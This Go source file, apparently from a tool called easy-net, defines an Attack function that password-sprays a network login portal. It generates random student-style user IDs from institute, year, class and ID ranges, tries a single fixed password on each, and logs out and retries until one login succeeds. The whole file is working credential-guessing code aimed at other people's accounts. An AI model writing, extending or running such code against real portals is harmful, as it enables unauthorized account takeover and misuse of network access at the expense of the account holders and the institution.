package auth

import (
	"fmt"
	"time"

	"nmnm.cc/easy-net/internal/log"
)

type AttackConfig struct {
	Host     string
	Base     string
	Link     string
	Password string
	Range    string
	Timeout  time.Duration
	// TargetSpeed string
}

var attackLogger = log.New("auth/attack")

func Attack(cfg *AttackConfig) error {
	instituteMin, instituteMax,
		yearMin, yearMax,
		classMin, classMax,
		idMin, idMax,
		err := ParseRange(cfg.Range)
	if err != nil {
		return fmt.Errorf("failed to parse range: %w", err)
	}

	tried := make(map[string]struct{})

	for {
		userid := RandomUserid(
			instituteMin, instituteMax,
			yearMin, yearMax,
			classMin, classMax,
			idMin, idMax)

		if cfg.Base == "" {
			base, err := FindPortal(cfg.Host, cfg.Link)
			if err != nil {
				return fmt.Errorf("failed to find portal: %w", err)
			}
			cfg.Base = base
		}

		if _, ok := tried[userid]; ok {
			continue
		} else {
			tried[userid] = struct{}{}
		}

		if err := Login(&LoginConfig{
			Base:     cfg.Base,
			Link:     cfg.Link,
			UserID:   userid,
			Password: cfg.Password,
		}); err != nil {
			attackLogger.Warn("failed to login", "error", err)

			if err := Logout(&LogoutConfig{
				Base:   cfg.Base,
				Link:   cfg.Link,
				UserID: userid,
			}); err != nil {
				return err
			}

			continue
		}

		break
	}

	return nil
}
